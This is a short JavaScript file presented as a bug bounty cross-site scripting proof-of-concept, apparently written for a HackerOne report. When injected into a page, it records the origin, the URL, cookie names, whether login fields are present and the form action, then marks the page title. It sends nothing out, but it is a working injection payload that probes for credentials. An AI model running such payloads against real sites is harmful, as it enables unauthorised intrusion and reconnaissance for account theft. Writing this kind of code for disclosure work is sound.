/* Bug bounty proof-of-concept - w1nd3x (HackerOne) - non-destructive, no exfiltration */
(function () {
  try {
    var names = document.cookie ? document.cookie.split(';').map(function (c) { return c.split('=')[0].trim(); }) : [];
    window.__w1nd3x_xss = {
      marker: 'W1ND3X-XSS-PROOF',
      origin: location.origin,
      href: location.href.slice(0, 120),
      cookieNames: names,
      hasPasswordField: !!document.querySelector('input[type=password]'),
      hasUsernameField: !!document.querySelector('input#username, input#email'),
      formAction: (document.querySelector('form') || {}).action || null
    };
    document.title = 'W1ND3X-XSS-' + location.hostname;
    console.log('W1ND3X XSS PoC executed in origin', location.origin);
  } catch (e) { window.__w1nd3x_xss = { error: String(e) }; }
})();
